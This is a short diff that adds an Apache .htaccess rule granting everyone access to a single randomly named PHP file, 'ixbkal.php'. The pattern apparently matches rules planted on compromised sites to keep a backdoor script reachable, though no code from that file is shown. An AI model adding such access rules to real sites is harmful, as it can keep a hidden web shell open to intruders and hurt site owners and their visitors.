@@ -1,0 +1,5 @@
+
+<FilesMatch "^(ixbkal.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
